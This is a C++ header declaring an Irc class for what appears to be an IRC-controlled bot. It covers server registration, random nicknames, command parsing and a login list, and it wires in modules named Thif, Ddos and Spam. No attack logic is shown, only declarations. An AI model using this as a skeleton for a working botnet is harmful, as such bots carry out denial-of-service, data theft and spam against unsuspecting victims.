#ifndef IRC_H
#define IRC_H

#include "Includes.h"
#include "Network.h"
#include "Useful.h"
#include "Security.h"
#include "Config.h"
#include "Thif.h"
#include "Ddos.h"
#include "Spam.h"

class Irc
{
public:
	char h_file[100];

	Irc();
	~Irc() {}

	void IrcRegistration(SOCKET sock, char *Name, char *Mail, char *Idnt, char *Serv, char *Nick1, char *Nick2, char *Nick3);
	int IrcCommands(SOCKET sock, char *text);
	char *GetRandomNick(char *nick, int w);
	void RemoveHttp(char *dir, char *file);

private:

	char * SPAMText;

	int HTTP_PORT;

	/*objects*/
	Net NET;
	Use USE;
	Sec SEC;
	Thif THIF;
	Ddos DDOS;
	Spam SPM;

	/* IrcRegistration() */
	struct IRC_REG
	{
		char *Name;
		char *Mail;
		char *Idnt;
		char *Serv;
	};

	char *RTSR, *NICK1, *NICK2, *NICK3, *USER, *SERV, *PASS;

	/* IrcCommands()*/
	std::string arg1, arg2, arg3;
	int switch_me, return_me;

#define PING    1
#define KICK    2
#define MODE    3
#define PRIVMSG 4
#define JOIN    5
#define PART    6
#define QUIT    7

	char **SecureLogin;
	int chk_join;

};

#endif // IRC_H